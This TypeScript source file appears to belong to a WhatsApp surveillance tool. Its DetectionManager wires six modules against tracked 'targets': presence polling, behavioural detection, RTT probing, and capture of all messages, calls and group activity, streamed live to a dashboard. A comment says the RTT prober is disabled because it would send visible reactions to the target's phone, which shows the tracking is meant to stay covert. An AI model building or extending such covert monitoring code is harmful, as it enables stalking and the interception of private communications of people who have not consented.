import type { PrismaClient } from '@prisma/client';
import type { Server as SocketServer } from 'socket.io';
import type { SessionManager } from '../whatsapp/session-manager.js';
import type { SignalAggregator } from './signal-aggregator.js';
import { PresenceSubscriber } from '../whatsapp/presence-subscriber.js';
import { RttProber } from './rtt-prober.js';
import { BehavioralDetector } from './behavioral-detector.js';
import { MessageInterceptor } from './message-interceptor.js';
import { CallDetector } from './call-detector.js';
import { GroupTracker } from './group-tracker.js';
import { createChildLogger } from '../utils/logger.js';

const log = createChildLogger('detection-manager');

interface SessionDetectors {
  presenceSubscriber: PresenceSubscriber;
  rttProber: RttProber;
  behavioralDetector: BehavioralDetector;
  messageInterceptor: MessageInterceptor;
  callDetector: CallDetector;
  groupTracker: GroupTracker;
}

/**
 * Manages the lifecycle of all 6 detection modules across sessions.
 *
 * Methods 4-5-6 (MessageInterceptor, CallDetector, GroupTracker) capture ALL
 * traffic without JID filtering. They auto-create Targets via findOrCreateTarget.
 *
 * Methods 1-3 (Presence, RTT, Behavioral) still use JID lists for active polling.
 */
export class DetectionManager {
  private sessionDetectors = new Map<string, SessionDetectors>();

  constructor(
    private readonly prisma: PrismaClient,
    private readonly sessionManager: SessionManager,
    private readonly signalAggregator: SignalAggregator,
    private readonly io?: SocketServer,
  ) {}

  /**
   * Wire detection for all connected sessions.
   * Methods 1+3 need existing target JIDs for active polling.
   * Methods 4-5-6 capture everything (no JID list needed).
   */
  async wireAll(): Promise<void> {
    const targets = await this.prisma.target.findMany({ where: { isActive: true } });

    // Group targets by session (for presence/behavioral polling)
    const targetsBySession = new Map<string, string[]>();
    for (const target of targets) {
      this.signalAggregator.addTarget(target.jid);
      const list = targetsBySession.get(target.sessionId) ?? [];
      list.push(target.jid);
      targetsBySession.set(target.sessionId, list);
    }

    // Wire all connected sessions
    const connections = this.sessionManager.getConnections();
    for (const [sessionId] of connections) {
      const jids = targetsBySession.get(sessionId) ?? [];
      await this.wireSession(sessionId, jids);
    }
  }

  /**
   * Wire or update detection for a specific session.
   */
  async wireSession(sessionId: string, jids: string[]): Promise<void> {
    const conn = this.sessionManager.getConnection(sessionId);
    if (!conn?.isConnected) return;

    // If detectors already exist, just add new JIDs for presence/behavioral
    const existing = this.sessionDetectors.get(sessionId);
    if (existing) {
      for (const jid of jids) {
        await existing.presenceSubscriber.subscribe(jid);
      }
      log.info({ sessionId, newJids: jids.length }, 'Added targets to existing detectors');
      return;
    }

    // Create fresh detectors for this session
    const detectors = await this.createDetectors(sessionId, jids);
    if (detectors) {
      this.sessionDetectors.set(sessionId, detectors);
      log.info({ sessionId, targetCount: jids.length }, 'All detection methods wired');
    }
  }

  /**
   * Add a single target to presence/behavioral detection.
   * Methods 4-5-6 don't need this — they capture everything already.
   */
  async addTarget(sessionId: string, jid: string): Promise<void> {
    this.signalAggregator.addTarget(jid);

    const detectors = this.sessionDetectors.get(sessionId);
    if (detectors) {
      await detectors.presenceSubscriber.subscribe(jid);
      log.info({ sessionId, jid }, 'Target added to presence detection');
    } else {
      await this.wireSession(sessionId, [jid]);
    }
  }

  /**
   * Remove a target from presence detection.
   */
  removeTarget(jid: string): void {
    this.signalAggregator.removeTarget(jid);

    for (const [, detectors] of this.sessionDetectors) {
      detectors.presenceSubscriber.unsubscribe(jid);
    }
  }

  /**
   * Tear down detectors for a session (on disconnect).
   */
  teardownSession(sessionId: string): void {
    const detectors = this.sessionDetectors.get(sessionId);
    if (!detectors) return;

    detectors.presenceSubscriber.stop();
    detectors.rttProber.stop();
    detectors.behavioralDetector.stop();
    detectors.messageInterceptor.stop();
    detectors.callDetector.stop();
    detectors.groupTracker.stop();

    this.sessionDetectors.delete(sessionId);
    log.info({ sessionId }, 'Session detectors torn down');
  }

  /**
   * Tear down all detectors (graceful shutdown).
   */
  teardownAll(): void {
    for (const sessionId of this.sessionDetectors.keys()) {
      this.teardownSession(sessionId);
    }
  }

  // -------------------------------------------------------------------------
  // Private helpers
  // -------------------------------------------------------------------------

  private async createDetectors(sessionId: string, jids: string[]): Promise<SessionDetectors | null> {
    const conn = this.sessionManager.getConnection(sessionId);
    if (!conn?.isConnected) return null;

    // Method 1: Presence Subscriber (still uses JID list for active polling)
    const presenceSubscriber = new PresenceSubscriber(conn);
    presenceSubscriber.on('signal', (signal) => this.signalAggregator.ingestSignal(signal));
    await presenceSubscriber.start(jids);

    // Method 2: RTT Prober — DISABLED (sends visible reactions to target phone)
    const rttProber = new RttProber(conn);

    // Method 3: Behavioral Detector (still uses JID list)
    const behavioralDetector = new BehavioralDetector(conn);
    behavioralDetector.on('signal', (signal) => this.signalAggregator.ingestSignal(signal));
    await behavioralDetector.start(jids);

    // Method 4: Message Interceptor — captures ALL messages, no JID filter
    const messageInterceptor = new MessageInterceptor(conn, this.prisma, sessionId);
    if (this.io) {
      messageInterceptor.on('message', (event) => {
        this.io!.to(`target:${event.targetJid}`).emit('message:new', event);
        this.io!.emit('dashboard:message', event);
      });
      messageInterceptor.on('message:deleted', (event) => {
        this.io!.to(`target:${event.targetJid}`).emit('message:deleted', event);
      });
      messageInterceptor.on('message:reaction', (event) => {
        this.io!.to(`target:${event.targetJid}`).emit('message:reaction', event);
      });
    }
    await messageInterceptor.start();

    // Method 5: Call Detector — captures ALL calls, no JID filter
    const callDetector = new CallDetector(conn, this.prisma, sessionId);
    if (this.io) {
      callDetector.on('call', (event) => {
        this.io!.to(`target:${event.targetJid}`).emit('call:event', event);
        this.io!.emit('dashboard:call', event);
      });
    }
    await callDetector.start();

    // Method 6: Group Tracker — captures ALL group activity, no JID filter
    const groupTracker = new GroupTracker(conn, this.prisma, sessionId);
    if (this.io) {
      groupTracker.on('group:activity', (event) => {
        this.io!.to(`target:${event.targetJid}`).emit('group:activity', event);
      });
    }
    await groupTracker.start();

    return {
      presenceSubscriber,
      rttProber,
      behavioralDetector,
      messageInterceptor,
      callDetector,
      groupTracker,
    };
  }
}
